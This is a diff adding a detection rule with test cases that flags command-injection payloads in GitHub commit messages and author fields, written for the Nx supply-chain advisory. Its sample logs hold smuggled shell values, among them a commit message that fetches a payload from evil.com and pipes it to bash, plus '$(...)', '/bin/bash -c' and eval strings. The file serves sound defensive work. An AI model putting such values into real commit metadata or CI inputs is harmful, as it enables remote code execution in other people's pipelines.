@@ -1,0 +1,220 @@
+AnalysisType: rule
+Filename: github_malicious_commit_content.py
+RuleID: "GitHub.Webhook.MaliciousCommitContent"
+DisplayName: "GitHub Malicious Commit Content"
+Enabled: true
+LogTypes:
+  - GitHub.Webhook
+Reports:
+  MITRE ATT&CK:
+    - TA0001:T1195.002  # Supply Chain Compromise: Compromise Software Supply Chain
+    - TA0003:T1098  # Persistence: Account Manipulation
+Tags:
+  - Code Injection
+  - Supply Chain
+  - Account Compromise
+Severity: High
+Description: >
+  Detects malicious patterns in GitHub commit content including commit messages, author names,
+  and author emails. These fields can contain injection payloads that may be executed by
+  vulnerable CI/CD workflows or git hooks. This rule is particularly important as commit metadata
+  is often trusted and may be processed unsafely. Based on patterns from the Nx vulnerability
+  (GHSA-cxm3-wv7p-598c).
+Runbook: |
+  1. Immediately investigate the commits identified with malicious patterns
+  2. Check if the author account may be compromised
+  3. Review all workflows and git hooks that process commit messages or author information
+  4. Look for signs of code execution in CI/CD logs
+  5. Revert malicious commits if confirmed
+  6. Reset credentials if the author account is compromised
+  7. Review repository access logs for suspicious activity
+  8. Consider temporarily disabling vulnerable workflows
+  9. Implement input sanitization for commit metadata processing
+  10. Contact the repository owner and security team
+Reference: https://github.com/nrwl/nx/security/advisories/GHSA-cxm3-wv7p-598c
+Tests:
+  - Name: Commit Message with Command Substitution
+    ExpectedResult: true
+    Log:
+      {
+        "ref": "refs/heads/main",
+        "before": "abc123",
+        "after": "def456",
+        "commits": [
+          {
+            "id": "def456",
+            "message": "Fix bug $(curl evil.com/payload | bash)",
+            "timestamp": "2024-01-15T10:30:00Z",
+            "url": "https://github.com/org/repo/commit/def456",
+            "author": {
+              "name": "developer",
+              "email": "peregrin@lotr.com"
+            }
+          }
+        ],
+        "head_commit": {
+          "id": "def456",
+          "message": "Fix bug $(curl evil.com/payload | bash)",
+          "author": {
+            "name": "developer",
+            "email": "peregrin@lotr.com"
+          }
+        },
+        "repository": {
+          "name": "repo",
+          "full_name": "org/repo"
+        },
+        "pusher": {
+          "name": "developer"
+        },
+        "p_log_type": "GitHub.Webhook"
+      }
+  - Name: Commit with Malicious Author Email
+    ExpectedResult: true
+    Log:
+      {
+        "ref": "refs/heads/feature",
+        "commits": [
+          {
+            "id": "xyz789",
+            "message": "Add new feature",
+            "author": {
+              "name": "attacker",
+              "email": "`/bin/bash -c 'malicious denethor@lotr.com"
+            }
+          }
+        ],
+        "head_commit": {
+          "id": "xyz789",
+          "message": "Add new feature",
+          "author": {
+            "name": "attacker",
+            "email": "john@justice.org"
+          }
+        },
+        "repository": {
+          "full_name": "victim/repo"
+        },
+        "pusher": {
+          "name": "attacker"
+        },
+        "p_log_type": "GitHub.Webhook"
+      }
+  - Name: Commit with Malicious Author Name
+    ExpectedResult: true
+    Log:
+      {
+        "ref": "refs/heads/main",
+        "commits": [
+          {
+            "id": "aaa111",
+            "message": "Update documentation",
+            "author": {
+              "name": "$(echo malicious)",
+              "email": "sam@lotr.com"
+            }
+          }
+        ],
+        "repository": {
+          "full_name": "target/repo"
+        },
+        "p_log_type": "GitHub.Webhook"
+      }
+  - Name: Multiple Commits with One Malicious
+    ExpectedResult: true
+    Log:
+      {
+        "ref": "refs/heads/develop",
+        "commits": [
+          {
+            "id": "commit1",
+            "message": "Normal commit",
+            "author": {
+              "name": "dev1",
+              "email": "frodo@lotr.com"
+            }
+          },
+          {
+            "id": "commit2",
+            "message": "Update /bin/bash -c 'malicious'",
+            "author": {
+              "name": "dev2",
+              "email": "aragorn@lotr.com"
+            }
+          }
+        ],
+        "head_commit": {
+          "id": "commit2",
+          "message": "Update /bin/bash -c 'malicious'",
+          "author": {
+            "name": "dev2",
+            "email": "aragorn@lotr.com"
+          }
+        },
+        "repository": {
+          "full_name": "org/repo"
+        },
+        "p_log_type": "GitHub.Webhook"
+      }
+  - Name: Normal Commit
+    ExpectedResult: false
+    Log:
+      {
+        "ref": "refs/heads/main",
+        "commits": [
+          {
+            "id": "normal123",
+            "message": "Fix authentication bug in login flow",
+            "author": {
+              "name": "John Doe",
+              "email": "denethor@lotr.com"
+            }
+          }
+        ],
+        "head_commit": {
+          "id": "normal123",
+          "message": "Fix authentication bug in login flow",
+          "author": {
+            "name": "John Doe",
+            "email": "denethor@lotr.com"
+          }
+        },
+        "repository": {
+          "full_name": "org/repo"
+        },
+        "p_log_type": "GitHub.Webhook"
+      }
+  - Name: Non-Push Event
+    ExpectedResult: false
+    Log:
+      {
+        "action": "opened",
+        "pull_request": {
+          "number": 1,
+          "title": "New feature"
+        },
+        "repository": {
+          "full_name": "org/repo"
+        },
+        "p_log_type": "GitHub.Webhook"
+      }
+  - Name: Commit with Eval Pattern
+    ExpectedResult: true
+    Log:
+      {
+        "ref": "refs/heads/main",
+        "commits": [
+          {
+            "id": "eval123",
+            "message": "eval($payload)",
+            "author": {
+              "name": "attacker",
+              "email": "attacker@evil.com"
+            }
+          }
+        ],
+        "repository": {
+          "full_name": "victim/repo"
+        },
+        "p_log_type": "GitHub.Webhook"
+      }
